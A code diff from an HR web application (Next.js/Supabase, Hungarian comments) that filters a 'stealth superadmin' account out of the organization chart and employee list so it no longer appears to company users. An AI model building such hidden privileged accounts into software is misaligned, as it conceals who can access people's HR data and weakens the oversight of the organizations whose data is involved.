@@ -2,6 +2,7 @@ import { createClient } from "@/utils/supabase/server"
 import { createClient as createAdminClient } from "@supabase/supabase-js"
 import { redirect } from "next/navigation"
 import { getActiveCompanyIdServer, getActiveCompanyMemberRolesServer } from "@/utils/company-server"
+import { isStealthSuperadmin, STEALTH_SUPERADMIN_ID } from "@/utils/stealth-superadmin"
 import { buildOrgTree, type OrgDolgozo, type OrgUnitNode } from "@/lib/org-chart-utils"
 import { OrganizationTabsView } from "@/components/hr/organization-tabs-view"
 import { normalizeHrRoleAndModules } from "@/utils/hr/company-role-resolver"
@@ -51,7 +52,9 @@ export default async function HrOrganizationPage({ searchParams }: PageProps) {
   ])
 
   const companyName = companyData?.name || "Aktív Vállalat"
-  const companyUserIds = (companyMembers || []).map(m => m.user_id)
+  const companyUserIds = (companyMembers || [])
+    .map(m => m.user_id)
+    .filter(uid => uid !== STEALTH_SUPERADMIN_ID)
   const safeMemberIds = companyUserIds.length > 0 ? companyUserIds : ["00000000-0000-0000-0000-000000000000"]
 
   // Párhuzamos adatlekérések a szervezeti struktúrához
@@ -108,8 +111,9 @@ export default async function HrOrganizationPage({ searchParams }: PageProps) {
   const dbJobs = dbJobsRes.data || []
   const employees = employeesRes.data || []
 
-  // Szigorúan csak az aktív eaisyHR munkavállalók (nem tisztán Docs tagok)
+  // Szigorúan csak az aktív eaisyHR munkavállalók (nem tisztán Docs tagok, és nem a rejtett rendszerfiók)
   const hrEmployees = employees.filter((emp: any) => {
+    if (isStealthSuperadmin(emp)) return false
     if (!emp.hr_dolgozo_adatlap) return false
     const adatlap = Array.isArray(emp.hr_dolgozo_adatlap) ? emp.hr_dolgozo_adatlap[0] : emp.hr_dolgozo_adatlap
     if (!adatlap) return false
